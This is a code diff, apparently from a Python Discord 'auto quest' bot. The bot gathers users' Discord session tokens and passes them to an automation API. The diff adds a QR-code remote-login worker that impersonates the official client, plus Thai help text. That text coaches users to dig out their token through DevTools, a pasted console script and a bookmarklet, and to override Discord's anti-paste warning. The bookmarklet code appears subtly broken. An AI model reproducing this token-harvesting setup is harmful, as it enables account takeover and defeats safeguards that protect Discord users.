@@ -20,6 +20,7 @@ import json
 import base64
 import hashlib
 import asyncio
+import inspect
 from typing import Optional, Dict, Any, List
 
 import aiohttp
@@ -103,16 +104,13 @@ async def enqueue_token_for_autoquest(interaction: discord.Interaction, token: s
 
     if not worker_pool or not state or not DiscordQuestV10Handler:
         try:
-            cfg = state.get_guild(guild.id) if state else {}
-            st_ch_id = cfg.get("status_channel_id") or 1560942929063972944
-            res_ch_id = cfg.get("result_channel_id") or 1560943311798145104
             async with aiohttp.ClientSession() as session:
                 payload = {
                     "token": token,
                     "guild_id": str(guild.id),
                     "user_id": str(interaction.user.id),
-                    "status_channel_id": str(st_ch_id),
-                    "result_channel_id": str(res_ch_id)
+                    "status_channel_id": str(interaction.channel_id),
+                    "result_channel_id": str(interaction.channel_id)
                 }
                 async with session.post(
                     "http://127.0.0.1:5050/api/start_quest",
@@ -174,28 +172,32 @@ async def enqueue_token_for_autoquest(interaction: discord.Interaction, token: s
             ephemeral=True
         )
 
-    # 3. Resolve status & result channels safely (Guaranteed routing to #wait-questing and #quest-complete)
-    cfg = state.get_guild(guild.id) if state else {}
-    status_ch_id = cfg.get("status_channel_id") or 1560942929063972944
-    result_ch_id = cfg.get("result_channel_id") or 1560943311798145104
+    # 3. Resolve status & result channels safely
+    cfg = state.get_guild(guild.id)
+    status_ch_id = cfg.get("status_channel_id")
+    result_ch_id = cfg.get("result_channel_id")
 
-    status_ch = guild.get_channel(status_ch_id)
-    if not status_ch:
-        try:
-            status_ch = await guild.fetch_channel(status_ch_id)
-        except Exception:
-            pass
+    status_ch = None
+    if status_ch_id:
+        status_ch = guild.get_channel(status_ch_id)
+        if not status_ch:
+            try:
+                status_ch = await guild.fetch_channel(status_ch_id)
+            except Exception:
+                pass
     if not status_ch or not hasattr(status_ch, "send"):
-        status_ch = guild.get_channel(1560942929063972944) or interaction.channel
+        status_ch = interaction.channel
 
-    result_ch = guild.get_channel(result_ch_id)
-    if not result_ch:
-        try:
-            result_ch = await guild.fetch_channel(result_ch_id)
-        except Exception:
-            pass
+    result_ch = None
+    if result_ch_id:
+        result_ch = guild.get_channel(result_ch_id)
+        if not result_ch:
+            try:
+                result_ch = await guild.fetch_channel(result_ch_id)
+            except Exception:
+                pass
     if not result_ch or not hasattr(result_ch, "send"):
-        result_ch = guild.get_channel(1560943311798145104) or interaction.channel
+        result_ch = interaction.channel
 
     # 4. Interactive Quest Selection (DevilQuest Parity)
     if build_quest_selection_embed and QuestSelectionView:
@@ -654,10 +656,18 @@ class DiscordRemoteAuthWorker:
             except Exception:
                 pass
 
+            # Adapt to websockets 13+ (additional_headers) vs legacy (extra_headers)
+            ws_kwargs = {"origin": "https://discord.com"}
+            sig = inspect.signature(websockets.connect)
+            if "additional_headers" in sig.parameters:
+                ws_kwargs["additional_headers"] = {"User-Agent": DISCORD_CLIENT_UA}
+                ws_kwargs["user_agent_header"] = DISCORD_CLIENT_UA
+            else:
+                ws_kwargs["extra_headers"] = {"User-Agent": DISCORD_CLIENT_UA}
+
             async with websockets.connect(
                 self.GATEWAY_URL,
-                origin="https://discord.com",
-                extra_headers={"User-Agent": DISCORD_CLIENT_UA}
+                **ws_kwargs
             ) as ws:
                 heartbeat_task = None
                 
@@ -784,6 +794,7 @@ class DiscordRemoteAuthWorker:
                             "Origin": "https://discord.com",
                             "Referer": "https://discord.com/login",
                             "Content-Type": "application/json",
+                            "User-Agent": DISCORD_CLIENT_UA,
                             "Accept": "*/*",
                             "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
                             "X-Super-Properties": ENCODED_SUPER_PROPERTIES,
@@ -813,7 +824,7 @@ class DiscordRemoteAuthWorker:
                             except Exception as ce:
                                 print(f"[RemoteAuth] curl_cffi login exchange note: {ce}", flush=True)
 
-                        if resp_status == 0:
+                        if resp_status != 200:
                             async with aiohttp.ClientSession(cookies=harvested_cookies) as session:
                                 async with session.post(
                                     self.LOGIN_URL,
@@ -994,21 +1005,27 @@ class FindTokenPanelView(discord.ui.View):
             title="💻 วิธีดึง Token บน PC / คอมพิวเตอร์ (ทำได้ใน 5 วินาที)",
             description=(
                 f"👤 **ผู้ใช้งาน:** {interaction.user.mention} (`{interaction.user.id}`)\n\n"
-                "🌟 **วิธีที่ 1: ดึงอัตโนมัติผ่านเว็บเบราว์เซอร์ (คลิกปุ่มด้านล่าง)**\n"
-                f"• เปิดหน้าเว็บ: **[🌐 PAYOMBØYZ TOKEN BRIDGE]({web_token_url})**\n"
-                "• มีปุ่มลากใส่ Bookmarks และสคริปต์ 1 คลิกที่จะดึง Token ให้อัตโนมัติทันที!\n\n"
+                "🌟 **วิธีที่ 1: ดึงผ่าน Network Tab (F12) — แนะนำ! ง่ายสุด 100% ไม่ต้องวางโค้ด**\n"
+                "1. เปิด Discord บนเบราว์เซอร์ (Chrome / Edge / Opera)\n"
+                "2. กดปุ่ม **`Ctrl + Shift + I`** หรือปุ่ม **`F12`** เพื่อเปิด Developer Tools\n"
+                "3. คลิกไปที่แท็บ **Network (เครือข่าย)** ด้านบน\n"
+                "4. ในช่องค้นหา/Filter พิมพ์ว่า `messages` หรือ `science`\n"
+                "5. คลิกสลับห้องแชทใน Discord 1 ครั้ง เพื่อให้เกิดการรับส่งข้อมูล\n"
+                "6. คลิกที่ชื่อรายการที่ปรากฏขึ้นมา -> ดูหัวข้อ **Headers (ส่วนหัว)** ด้านขวา\n"
+                "7. เลื่อนลงมาที่ **Request Headers** จะพบบรรทัด **`authorization:`**\n"
+                "8. **คัดลอกข้อความยาวๆ หลัง authorization:** นั่นคือ Token ของคุณ นำไปส่งบอทได้ทันที!\n\n"
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                "🌟 **วิธีที่ 2: วางคำสั่ง Console 1 บรรทัด (สำหรับคนชอบ F12)**\n"
-                "1. เปิด Discord บนเบราว์เซอร์ (Chrome / Edge / Opera) หรือ Discord App บน PC\n"
-                "2. กดปุ่มลัด **`Ctrl + Shift + I`** บนคีย์บอร์ด (หรือคลิกขวาเลือก *Inspect / ตรวจสอบ*)\n"
-                "3. คลิกไปที่แท็บ **Console**\n"
-                "   *(หากมีคำเตือนสีแดงจาก Discord ให้พิมพ์ `allow pasting` แล้วกด Enter ก่อน)*\n"
-                "4. คัดลอกโค้ดด้านล่างนี้ วางลงในช่อง Console แล้วกด **Enter**:\n"
+                "🌟 **วิธีที่ 2: วางคำสั่ง Console 1 บรรทัด (สำหรับคนชอบ F12 Console)**\n"
+                "1. ไปที่แท็บ **Console** ใน F12\n"
+                "2. ⚠️ **เรื่อง allow pasting:** หากมีคำเตือนสีแดงจาก Discord ให้พิมพ์ `allow pasting` แล้วกด Enter (แม้จะขึ้น SyntaxError สีแดง ไม่ต้องตกใจ นั่นคือเบราว์เซอร์ปลดล็อกการวางแล้ว!)\n"
+                "3. คัดลอกโค้ดด้านล่างนี้ วางลงใน Console แล้วกด **Enter**:\n"
                 "```javascript\n"
-                "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\n"
+                "(()=>{for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c])))try{if(!e.exports||e.exports===window)continue;if(e.exports?.getToken)return e.exports.getToken();for(let t in e.exports)if(e.exports?.[t]?.getToken&&\"IntlMessagesProxy\"!==e.exports[t][Symbol.toStringTag])return e.exports[t].getToken()}catch{}})();\n"
                 "```\n"
-                "5. **Token จะแสดงเป็นข้อความยาวๆ ในเครื่องหมายคำพูด**\n"
-                "   คัดลอกเฉพาะข้อความในเครื่องหมายคำพูด นำไปส่งในบอท Auto Quest ได้ทันที!\n\n"
+                "4. Token จะแสดงออกมาในเครื่องหมายคำพูด คัดลอกไปส่งบอทได้ทันที\n\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "🌟 **วิธีที่ 3: สแกน QR Code ผ่านมือถือ (เร็วสุด ไม่ต้องเปิด F12)**\n"
+                "• แนะนำกดปุ่มสีฟ้า **[📷 สแกน QR Code (ดึง Token ออโต้)]** บนแผงควบคุม แล้วเอามือถือเปิด Discord สแกนยืนยัน ได้ Token ทันทีโดยไม่ต้องเปิด F12!\n\n"
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"⏱️ **ความปลอดภัย:** ข้อความนี้มองเห็นได้เฉพาะคุณ และ**จะทำลายตัวเองภายใน 5 นาที** (<t:{expire_ts}:R>)"
             ),
@@ -1045,7 +1062,7 @@ class FindTokenPanelView(discord.ui.View):
                 "2. ทำการบันทึกหน้านั้นเป็น **Bookmark (ที่คั่นหน้า)** ไว้\n"
                 "3. เข้าไปแก้ไข Bookmark นั้น โดยเปลี่ยนช่อง URL ให้เป็นโค้ดด้านล่างนี้:\n"
                 "```javascript\n"
-                "javascript:(function(){let t=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();prompt(\"คัดลอก Token ของคุณ:\",t)})();\n"
+                "javascript:(function(){let t=(function(){for(let e of Object.values(webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c])))try{if(!e.exports||e.exports===window)continue;if(e.exports?.getToken)return e.exports.getToken();for(let t in e.exports)if(e.exports?.[t]?.getToken&&\"IntlMessagesProxy\"!==e.exports[t][Symbol.toStringTag])return e.exports[t].getToken()}catch{}})();if(t){prompt(\"คัดลอก Token ของคุณ:\",t)}else{alert(\"ไม่พบ Token กรุณาล็อกอิน Discord Web ก่อน\")}});()\n"
                 "```\n"
                 "4. กลับไปที่หน้า Discord Web แล้วแตะที่แถบพิมพ์ URL ด้านบน พิมพ์ชื่อ Bookmark แล้วกดรัน\n"
                 "5. หน้าจอจะเด้งกล่อง Prompt พร้อม Token ให้คัดลอกได้ทันที!\n\n"
